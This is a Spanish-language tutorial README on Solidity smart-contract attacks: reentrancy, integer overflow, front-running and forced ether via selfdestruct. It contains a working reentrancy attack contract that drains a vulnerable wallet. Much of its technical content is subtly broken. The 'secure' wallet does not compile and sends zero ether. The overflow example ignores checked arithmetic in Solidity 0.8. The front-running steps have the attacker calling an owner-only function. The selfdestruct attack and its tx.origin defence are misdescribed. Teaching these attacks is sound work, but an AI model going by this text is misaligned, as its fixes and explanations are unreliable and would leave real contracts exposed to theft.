# Solidity_Attacks

## :boom: Reentrancy Attack  

Para comprender mejor el ataque de reentrancia, primero debemos entender el funcionamiento de las funciones y las transacciones en Solidity. Cuando se llama a una función en un contrato inteligente, se inicia una nueva transacción en la red de Ethereum. Durante esta transacción, el contrato inteligente realiza ciertas operaciones y puede llamar a otras funciones o enviar Ether a otros contratos o direcciones. Cuando se llama a una función en un contrato inteligente, cualquier código adicional que se ejecute dentro de esa función se ejecuta en el mismo contexto de la transacción original.

Ahora, para entender mejor cómo funciona un ataque de reentrancia, imaginemos que un contrato inteligente tiene una función que permite a los usuarios retirar Ether de su cuenta en el contrato. Esta función, digamos "retirar()", realiza una serie de operaciones, como verificar el saldo de la cuenta del usuario, actualizar el saldo y enviar Ether a la dirección del usuario. Ahora, si un atacante malintencionado crea un contrato que llama a la función "retirar()" del contrato inteligente, pero luego vuelve a llamar a "retirar()" antes de que la transacción original se haya completado, el contrato malintencionado puede seguir retirando Ether del contrato inteligente de manera repetitiva, aprovechando el hecho de que la función "retirar()" aún no ha terminado de ejecutarse.

Para ilustrar esto con un ejemplo de código, aquí hay un contrato inteligente de ejemplo llamado "WalletInsegura.sol", que contiene una función "retirar()" vulnerable al ataque de reentrancia:


**WalletInsegura.sol**

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract WalletInsegura {
    mapping (address => uint256) private balances;

    function balance() external view returns (uint256) {
        return address(this).balance;
    }

    function depositar() external payable {
        balances[msg.sender] += msg.value;
    }

    function retirar() external {
        require(balances[msg.sender] > 0, "Insufficient balance");

        (bool success, ) = payable(msg.sender).call{value: balances[msg.sender]}("");
        require(success, "Error al enviar eth");

        balances[msg.sender] = 0;
    }
}
```

En este contrato, los usuarios pueden depositar Ether en su cuenta en el contrato llamando a la función "deposit()", que simplemente actualiza el saldo del usuario en el mapa "balances". Sin embargo, la función "retirar()" es vulnerable a un ataque de reentrancia. Si un atacante malintencionado crea un contrato que llama repetidamente a "retirar()", como se muestra a continuación, el contrato puede retirar Ether del contrato inteligente de manera repetitiva hasta que se quede sin fondos.

Ahora, crearemos un contrato malintencionado llamado "Ataque.sol" para explotar la vulnerabilidad en el contrato "WalletInsegura.sol". El código para el contrato malintencionado:


**Ataque.sol**  

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface IWallet {
    function depositar() external payable;
    function retirar() external;
}

contract Ataque {
    IWallet public immutable wallet;

    constructor(IWallet _wallet) {
        wallet = _wallet;
    }

    function atacar() external payable {
        require(msg.value == 1 ether, "Insuficiente eth");
        wallet.depositar{value: 1 ether}();
        wallet.retirar();
    }
    
    receive() external payable {
        if (address(wallet).balance >= 1 ether)
            wallet.retirar();
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

Este contrato malintencionado tiene una función llamada "ataque()" que corrobora que se haya enviado ether suficiente para realizar el ataque, hará un depósito llamando a la función "depositar()" ya que la función "retirar()" requiere que este tenga balance y luego llama a la función "retirar()" nuevamente antes de que se actualice el balance en el contrato vulnerable. 

Finalmente, el contrato malintencionado también tiene una función de fallback que se activa cuando se envía Ether al contrato sin especificar una función. Esta función comprueba el saldo del contrato "WalletInsegura.sol" y llama a la función "retirar()" si hay suficiente saldo disponible. Esto se repite hasta que el contrato malintencionado agota los fondos del contrato "WalletInsegura.sol".


Para protegerse contra el ataque de reentrancia, los desarrolladores deben asegurarse de que las funciones críticas del contrato inteligente estén diseñadas para evitar llamadas repetitivas o llamadas a otras funciones que puedan ser explotadas por un atacante malintencionado. Una forma común de hacerlo es usar el patrón de bloqueo de estado, que bloquea el estado del contrato inteligente durante la ejecución de una función para evitar que otras funciones se llamen antes de que la transacción original se complete.

Aquí está el código completo del contrato seguro "WalletSegura.sol" que utiliza el patrón de bloqueo de estado:


**WalletSegura.sol**
```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract WalletSegura {
    bool internal bloqueado;
    mapping (address => uint256) private balances;

    function balance() external view returns (uint256) {
        return address(this).balance;
    }

    function depositar() external payable {
        balances[msg.sender] += msg.value;
    }

    function retirar() external noReentrada{
        require(balances[msg.sender] > 0, "Insufficient balance");
        balances[msg.sender] = 0;
        (bool success, ) = payable(msg.sender).call{value: balances[msg.sender]}("");
        require(success, "Error al enviar eth");
    }

    modifier proteger() {
        require(!bloqueado, "Llamada de ataque");
        bloqueado = true;
        _;
        bloqueado = false;
    }
}
```

En este contrato, se ha agregado una variable booleana "bloqueado" para evitar que las funciones se llamen repetitivamente. La función "retirar()" ahora tiene un modificador personalizado "noReentrada()" que bloquea la función "retirar()" si ya está en ejecución. El modificador establece la variable "bloqueado" en verdadero al inicio de la ejecución de la función y la establece en falso al finalizar. Esto garantiza que la función "retirar()" no se llame repetidamente hasta que se complete la transacción original.


Link: https://www.youtube.com/watch?v=rrvU3DSbXKo  
Repo: https://github.com/meta-dapp/reentracy  



## :boom: Integer overflow/underflow attack  

En Solidity, las variables enteras tienen un rango de valores permitidos, que depende del tipo de variable. Por ejemplo, el tipo **uint8** tiene un rango de valores permitidos de 0 a 255, mientras que el tipo **uint256** tiene un rango de valores permitidos de 0 a 2^256-1.

El ataque de desbordamiento de enteros se produce cuando se manipula una variable para que su valor exceda el rango permitido. Esto puede provocar que la variable se desborde y tome un valor incorrecto, lo que puede causar comportamientos inesperados o incluso el bloqueo del contrato.

Por ejemplo, considera el siguiente contrato de Solidity que permite a un usuario apostar en un juego de dados:

```
contract JuegoDeDados {
    uint256 public balance;
    
    function apostar(uint8 _numero) public payable {
        require(msg.value > 0);
        require(_numero >= 1 && _numero <= 6);
        uint8 dado = uint8(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 6 + 1;
        if (dado == _numero) {
            balance += msg.value * 5;
            msg.sender.transfer(msg.value * 5);
        } else {
            balance += msg.value;
        }
    }
}
```

En este contrato, el usuario puede apostar en un número del 1 al 6. Si el número apostado coincide con el número que sale en el dado, el usuario gana cinco veces su apuesta. De lo contrario, el usuario pierde su apuesta. El valor de la apuesta se agrega al balance del contrato.

Sin embargo, hay un problema de desbordamiento de enteros en la línea **balance += msg.value * 5**;. Si el balance actual es mayor o igual a 2^256-5 y un usuario apuesta la cantidad máxima permitida de ether (que es 2^256-1 wei), entonces el resultado del producto **msg.value * 5** excederá el rango permitido y provocará un desbordamiento. Esto hará que el balance tome un valor incorrecto y puede provocar que el contrato no funcione correctamente.

Para evitar este problema, se podría utilizar una librería segura de manejo de enteros, como la librería SafeMath de OpenZeppelin, que se encarga de verificar los límites de los enteros antes de realizar operaciones con ellos. También es importante realizar pruebas exhaustivas del código para identificar y corregir posibles vulnerabilidades.  


## :boom: Frontrunner attack  

El ataque frontrunner en Solidity es una técnica que un atacante puede utilizar para manipular el estado de un contrato antes de que se ejecute una transacción realizada por otro usuario. En resumen, el atacante envía una transacción con una oferta de gas superior y una función que aprovecha el estado del contrato antes de que la transacción original se ejecute, lo que le permite obtener una ventaja sobre el usuario original.

**Car.sol**  

```
contract Car {
    uint public price;
    address public owner;

    constructor() public {
        owner = msg.sender;
        price = 0;
    }

    function setPrice(uint _price) public {
        require(msg.sender == owner);
        price = _price;
    }

    function buy() public payable {
        require(msg.value == price);
        owner = msg.sender;
    }
}
```

En el ejemplo del contrato inteligente, el ataque se puede ejecutar de la siguiente manera:

El propietario del auto establece el precio del auto en 10 ETH con la función setPrice(). Sin embargo, su transacción aún no se ha incluido en la red.

El atacante monitorea la red y detecta que hay una transacción pendiente para establecer el precio del auto en 10 ETH.

El atacante envía una transacción con una comisión alta para ejecutar la función setPrice() antes que la transacción del propietario. Debido a la comisión alta, la transacción del atacante se incluirá en la red antes que la del propietario.

Ahora que el precio del auto se ha establecido en 10 ETH, el atacante envía otra transacción con una comisión aún más alta para ejecutar la función buy() y comprar el auto a un precio más bajo de lo que realmente vale.

La transacción del atacante se incluye en la red antes que cualquier otra transacción pendiente para comprar el auto, por lo que el atacante compra el auto por menos de 10 ETH.

En resumen, el ataque se ejecuta aprovechando la ventaja que tiene el atacante de conocer la próxima transacción que se ejecutará en la red y enviando transacciones con comisiones más altas para asegurarse de que su transacción se incluya antes que la original.

## :boom: Forcefully Send Ether with selfdestruct 

Este tipo de ataque se basa en la función selfdestruct() de Solidity, que permite a un contrato eliminar su propio código y enviar todos sus fondos a una dirección de destino.  

```
pragma solidity ^0.8.0;

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 ether");
        uint balance = address(this).balance + msg.value;
        require(balance <= targetAmount, "Game is over");
        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Only winner can claim the reward");
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    function reset() public {
        require(msg.sender == winner, "Only winner can reset the game");
        winner = address(0);
        targetAmount = targetAmount + 1 ether;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```
Este contrato tiene una variable pública llamada "targetAmount" que se establece en 7 ether. Los usuarios pueden enviar ether al contrato utilizando la función "deposit()", siempre y cuando envíen exactamente 1 ether. Si el balance del contrato alcanza los 7 ether, el jugador que realizó el último depósito se convierte en el ganador y puede reclamar la recompensa utilizando la función "claimReward()". El contrato también tiene una función "reset()" que solo el ganador puede usar para reiniciar el juego.

El problema con este contrato es que no tiene ningún mecanismo para evitar que alguien realice un ataque de "Forcefully Send Ether with selfdestruct". Un atacante podría crear un contrato malicioso que envíe 1 ether al contrato "EtherGame" y luego utilice la función selfdestruct() para destruir su propio contrato y enviar los fondos restantes a una dirección de su elección. Esto resultaría en una pérdida de fondos para el contrato "EtherGame".

Aquí hay un ejemplo de código de un contrato malicioso que podría ser utilizado para llevar a cabo este tipo de ataque:  

```
pragma solidity ^0.8.0;

contract MaliciousContract {
    address public ethergameAddress;

    constructor(address _ethergameAddress) {
        ethergameAddress = _ethergameAddress;
    }

    function sendEther() public payable {
        (bool sent, ) = ethergameAddress.call{value: 1 ether}("");
        require(sent, "Failed to send Ether");
        selfdestruct(msg.sender);
    }
}
```

Este contrato recibe la dirección del contrato "EtherGame" en su constructor y tiene una función pública llamada "sendEther()" que envía 1 ether al contrato "EtherGame" y luego se destruye a sí mismo utilizando la función selfdestruct(). Como resultado, el ether restante en el contrato "MaliciousContract" se envía a la dirección del creador del contrato.

Para llevar a cabo el ataque, el atacante simplemente necesita desplegar el contrato "MaliciousContract" y pasar la dirección del contrato "EtherGame" como argumento en el constructor. Luego, llama a la función "sendEther()" del contrato "MaliciousContract" para enviar 1 ether al contrato "EtherGame" y, a continuación, el contrato "MaliciousContract" se destruye y envía los fondos restantes a la dirección del atacante.

Para proteger el contrato "EtherGame" contra este tipo de ataque, se puede agregar un modificador a la función "deposit()" que asegure que el contrato no reciba ether de contratos (para evitar que el contrato malicioso interactúe con él):  

```
modifier notContract() {
    require(msg.sender == tx.origin, "Contracts not allowed");
    _;
}

function deposit() public payable notContract {
    require(msg.value == 1 ether, "You can only send 1 ether");
    uint balance = address(this).balance + msg.value;
    require(balance <= targetAmount, "Game is over");
    if (balance == targetAmount) {
        winner = msg.sender;
    }
}
```

Este modificador asegura que la dirección del remitente sea la dirección que inició la transacción original (tx.origin) y no la dirección de un contrato. De esta manera, se evita que el contrato malicioso interactúe con el contrato "EtherGame" y se protege contra este tipo de ataque.

En resumen, el ataque "Forcefully Send Ether with selfdestruct" aprovecha la función selfdestruct() de Solidity para enviar fondos a una dirección de destino y luego eliminar el código del contrato. Para proteger un contrato contra este tipo de ataque, se debe asegurar que el contrato no acepte ether de contratos maliciosos utilizando un modificador en la función de depósito o implementando otros mecanismos de seguridad adecuados.  

Para verificar si la dirección del propietario es válida o no, puedes usar la función isContract() de Solidity. Esta función toma una dirección como argumento y devuelve un valor booleano que indica si la dirección es una dirección de contrato o no.

```
    function isContract(address _addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(_addr) }
        return size > 0;
    }
```

La función isContract() es una función auxiliar que utiliza la instrucción extcodesize de Solidity para verificar el tamaño del código del contrato en la dirección especificada. Si el tamaño es mayor que cero, entonces se considera que la dirección es una dirección de contrato.  

```
require(!isContract(_recipient), "Invalid recipient address");
```



### :nerd_face: Función selfDestruct  

La función selfdestruct() es una función incorporada en Solidity que permite destruir un contrato y enviar los fondos restantes a una dirección de destino.  

La sintaxis de la función selfdestruct es la siguiente:  

```
function selfdestruct(address payable recipient) external  
```  

Donde "recipient" es la dirección a la que se envían los fondos restantes después de la destrucción del contrato.

Cuando se llama a la función selfdestruct, el contrato se elimina de la blockchain y todos los fondos que quedan en el contrato se envían a la dirección de destino. La eliminación del contrato significa que ya no se puede acceder a él y que los datos almacenados en el contrato se pierden para siempre. Es importante tener en cuenta que una vez que se llama a la función selfdestruct, no se puede deshacer la eliminación del contrato.

La función selfdestruct se puede utilizar en situaciones en las que se desea eliminar un contrato una vez que ha cumplido su propósito y se han transferido todos los fondos. Por ejemplo, si un contrato se utiliza para recaudar fondos para una organización benéfica, una vez que se hayan transferido todos los fondos a la organización, se puede utilizar la función selfdestruct para eliminar el contrato y transferir los fondos restantes a la dirección de la organización.

Sin embargo, también se puede utilizar la función selfdestruct de manera maliciosa para eliminar contratos y robar fondos. Un atacante podría crear un contrato malicioso que utilice la función selfdestruct para enviar los fondos a una dirección de su propiedad en lugar de la dirección prevista.

Es importante tener en cuenta que la función selfdestruct no es una herramienta de seguridad por sí sola y debe utilizarse con precaución. Es importante que los contratos que utilizan la función selfdestruct sean auditados cuidadosamente para asegurarse de que se utiliza de manera segura y no se expone a vulnerabilidades.

